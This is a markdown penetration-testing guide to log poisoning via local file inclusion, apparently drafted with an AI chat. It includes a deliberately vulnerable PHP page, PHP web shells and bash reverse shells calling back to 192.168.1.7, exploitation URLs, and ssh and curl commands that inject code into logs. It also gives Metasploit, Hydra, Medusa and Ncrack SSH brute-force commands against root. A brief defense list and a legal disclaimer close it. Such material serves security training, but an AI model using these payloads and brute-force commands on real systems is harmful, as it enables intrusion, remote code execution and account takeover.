# 🔥 Log Poisoning Attack - Complete Guide

## 📋 Table of Contents

- [Overview](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#overview)
- [Vulnerable Code Analysis](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#vulnerable-code-analysis)
- [Attack Payloads](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#attack-payloads)
- [Exploitation URLs](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#exploitation-urls)
- [Log Poisoning Vectors](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#log-poisoning-vectors)
- [SSH Log Poisoning Setup](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#ssh-log-poisoning-setup)
- [Metasploit SSH Tools Installation](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#metasploit-ssh-tools-installation)
- [Verification](https://claude.ai/chat/b0ec7764-e9fc-4468-b7a4-896665d20cb5#verification)

---

## 🎯 Overview

Log Poisoning is a technique where an attacker injects malicious code into log files that are later processed by a vulnerable application through Local File Inclusion (LFI). This can lead to Remote Code Execution (RCE).

---

## 💻 Vulnerable Code Analysis

### 📄 local-file-inclusion-4.php

The vulnerable application writes request information to a log file and allows file inclusion:

```php
<?php
date_default_timezone_set('Asia/Kolkata');

function getRealIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$realIp = getRealIpAddr();
$remoteIp = $_SERVER['REMOTE_ADDR'];
$uri = $_SERVER['REQUEST_URI'] ?? 'Unknown';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'Direct Access / Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$dateTime = date("Y-m-d H:i:s T");

$logEntry = <<<LOG
<hr>
<b>Date:</b> $dateTime<br>
<b>IP (REMOTE_ADDR):</b> $remoteIp<br>
<b>IP (Detected):</b> $realIp<br>
<b>Page:</b> $uri<br>
<b>Referrer:</b> $referrer<br>
<b>User-Agent:</b> $userAgent<br>
LOG;

file_put_contents("log/log.html", $logEntry . PHP_EOL, FILE_APPEND | LOCK_EX);

if (isset($_REQUEST["file"])) {
    $local_file = "log/" . $_REQUEST["file"] . ".html";
    include($local_file);
}
?>
```

**⚠️ Vulnerability:** The `$userAgent` variable is directly written to the log file without sanitization, and the log file can be included via the `file` parameter.

---

## 🎯 Attack Payloads

### 1️⃣ Basic Command Execution Test

```php
<?php system('bash -l >& /dev/tcp/192.168.1.7/443 0>&1'); ?>
```

### 2️⃣ Using GET Parameter for Commands

```php
<?php echo system($_GET['cmd']); ?>
```

### 3️⃣ Direct Bash Reverse Shell

```php
<?php /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.7/443 0>&1' ?>
```

---

## 🔗 Exploitation URLs

Replace the file path and LFI parameter as needed:

### 🔍 Basic Log Access

```
http://192.168.1.31/web-pentest/local-file-inclusion-4.php?file=log&cmd=uname-a
```

### 🔍 Command Injection via GET

```
http://192.168.1.31/web-pentest/local-file-inclusion-4.php?file=log&cmd=id
```

### 🔍 Configuration File Access

```
http://192.168.1.31/web-pentest/local-file-inclusion-4.php?file=log&cmd=ifconfig
```

---

## 📝 Other Log Poisoning Vectors

### 🌐 Nginx

**Log Location:** `/var/log/nginx/access.log`

**Payload Injection:**

```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com
```

### 🔐 VSFTPD

**Log Location:** `/var/log/vsftpd.log`

**Technique:** Login with a crafted username containing PHP code

### 🔑 SSH

**Log Location:** `/var/log/auth.log`

**Technique:** Log in using a username like:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target
```

---

## 🔐 SSH Log Poisoning Setup

### 📦 Install and Configure rsyslog on Debian/Ubuntu

#### Update package lists:

```bash
apt update
```

#### Install rsyslog:

```bash
apt install rsyslog -y
```

#### Enable and start the service:

```bash
systemctl enable rsyslog
systemctl start rsyslog
systemctl status rsyslog
```

---

## ⚙️ Configuration for SSH Logging

### 📂 Config Files

- **Main config:** `/etc/rsyslog.conf`
- **Extra configs:** `/etc/rsyslog.d/`

### 🔧 Default Behavior

Authentication logs (including SSH) go to:

```
/var/log/auth.log
```

### ✅ Check Default Auth Settings

In `/etc/rsyslog.d/50-default.conf`, ensure this line exists:

```bash
auth,authpriv.*    /var/log/auth.log
```

---

## 🎨 Custom SSH Logging (Optional)

To create a dedicated SSH log file:

#### Edit configuration:

```bash
vim /etc/rsyslog.d/sshd.conf
```

#### Add:

```bash
if $programname == 'sshd' then /var/log/sshd.log
& stop
```

---

## 🔄 Apply Changes

Restart rsyslog:

```bash
systemctl restart rsyslog
```

---

## ✅ Verification

### Check if logs are being written:

```bash
tail -f /var/log/auth.log
```

### If custom file configured:

```bash
tail -f /var/log/sshd.log
```

**📌 Note:** You should see SSH login attempts (successful and failed) logged in real-time.

---

## 🚀 Metasploit SSH Tools Installation (Kali Linux)

### 📦 Update System

```bash
sudo apt update && sudo apt upgrade -y
```

### 🔧 Install Metasploit Framework

```bash
sudo apt install metasploit-framework -y
```

### 🎯 Install SSH Auxiliary Tools

Metasploit comes with built-in SSH modules. Verify installation:

```bash
msfconsole
```

Inside Metasploit console:

```bash
search ssh
```

### 🔑 Common SSH Modules in Metasploit

#### 1. SSH Login Scanner

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target_ip
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

#### 2. SSH Version Scanner

```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS target_ip
run
```

#### 3. SSH User Enumeration

```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS target_ip
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
run
```

### 📚 Additional SSH Tools Installation

#### Install Hydra (SSH Brute Force)

```bash
sudo apt install hydra -y
```

**Usage:**

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target_ip
```

#### Install Medusa

```bash
sudo apt install medusa -y
```

**Usage:**

```bash
medusa -h target_ip -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

#### Install Ncrack

```bash
sudo apt install ncrack -y
```

**Usage:**

```bash
ncrack -p 22 --user root -P /usr/share/wordlists/rockyou.txt target_ip
```

---

## 🎪 Inject PHP Code with SSH

After setting up SSH logging, inject the payload:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target
```

### 🔍 After the injection, use LFI:

```bash
http://target/vuln.php?file=/var/log/auth.log&cmd=id
```

---

## 🛡️ Defense Mechanisms

1. **Input Validation** - Sanitize all user inputs
2. **Whitelist File Inclusion** - Only allow specific files
3. **Disable Dangerous Functions** - Add to `php.ini`:
    
    ```ini
    disable_functions = exec,passthru,shell_exec,system,proc_open,popen
    ```
    
4. **Log File Permissions** - Restrict web server access to logs
5. **Web Application Firewall (WAF)** - Detect malicious patterns
6. **Least Privilege Principle** - Run web services with minimal permissions

---

## ⚠️ Legal Disclaimer

**This guide is for educational and authorized penetration testing purposes only.**

- Only test systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Always follow responsible disclosure practices
- Use this knowledge ethically and legally

---

## 📚 References

- OWASP LFI Guide
- PortSwigger Web Security Academy
- HackTricks - Log Poisoning
- Metasploit Unleashed

---

## 🏆 Summary

Log Poisoning combined with LFI is a powerful attack vector that can lead to full system compromise. Understanding this technique helps security professionals:

- Identify vulnerable applications
- Implement proper input validation
- Secure log file access
- Design better security architectures

**Remember:** With great power comes great responsibility. Use wisely! 🎯

---

**Created for:** Web Application Penetration Testing  
**Environment:** Kali Linux / Debian / Ubuntu  
**Target:** Educational Lab Environment